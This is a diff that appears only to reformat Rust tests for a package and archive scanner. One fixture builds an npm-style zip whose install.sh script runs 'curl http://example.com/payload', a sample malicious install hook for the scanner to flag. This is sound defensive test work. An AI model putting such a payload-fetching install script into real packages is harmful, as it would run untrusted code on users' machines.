@@ -2029,15 +2029,16 @@ mod tests {
 
         // Add package.json (npm package indicator)
         zip.start_file("package.json", options).unwrap();
-        std::io::Write::write_all(
-            &mut zip,
-            br#"{"name": "test-package", "version": "1.0.0"}"#,
-        )
-        .unwrap();
+        std::io::Write::write_all(&mut zip, br#"{"name": "test-package", "version": "1.0.0"}"#)
+            .unwrap();
 
         // Add a shell script (could be suspicious in npm context)
         zip.start_file("install.sh", options).unwrap();
-        std::io::Write::write_all(&mut zip, b"#!/bin/sh\necho 'Installing...'\ncurl http://example.com/payload").unwrap();
+        std::io::Write::write_all(
+            &mut zip,
+            b"#!/bin/sh\necho 'Installing...'\ncurl http://example.com/payload",
+        )
+        .unwrap();
 
         zip.finish().unwrap();
 
@@ -2057,7 +2058,10 @@ mod tests {
             "Should have package.json entry"
         );
         assert!(
-            report.archive_contents.iter().any(|e| e.path == "install.sh"),
+            report
+                .archive_contents
+                .iter()
+                .any(|e| e.path == "install.sh"),
             "Should have install.sh entry"
         );
     }
@@ -2167,12 +2171,18 @@ mod tests {
 
         // Verify streaming processed files
         let files_processed = files_seen.load(std::sync::atomic::Ordering::Relaxed);
-        assert!(files_processed >= 2, "Should have processed at least 2 files");
+        assert!(
+            files_processed >= 2,
+            "Should have processed at least 2 files"
+        );
 
         // Verify report has summary (streaming mode doesn't populate report.files to save memory)
         assert!(report.summary.is_some());
         let summary = report.summary.unwrap();
-        assert!(summary.files_analyzed >= 2, "Summary should show analyzed files");
+        assert!(
+            summary.files_analyzed >= 2,
+            "Summary should show analyzed files"
+        );
     }
 
     // =========================================================================
@@ -2307,12 +2317,14 @@ mod tests {
         let report = result.unwrap();
 
         // Check for the image anomaly finding
-        let has_image_finding = report.findings.iter().any(|f| {
-            f.id.contains("npm-package-with-image") || f.id.contains("archive-has-png")
-        }) || report
-            .files
-            .iter()
-            .any(|file| file.findings.iter().any(|f| f.id.contains("archive-has-png")));
+        let has_image_finding =
+            report.findings.iter().any(|f| {
+                f.id.contains("npm-package-with-image") || f.id.contains("archive-has-png")
+            }) || report.files.iter().any(|file| {
+                file.findings
+                    .iter()
+                    .any(|f| f.id.contains("archive-has-png"))
+            });
 
         // Log findings for debugging
         eprintln!("NPM+PNG test findings:");
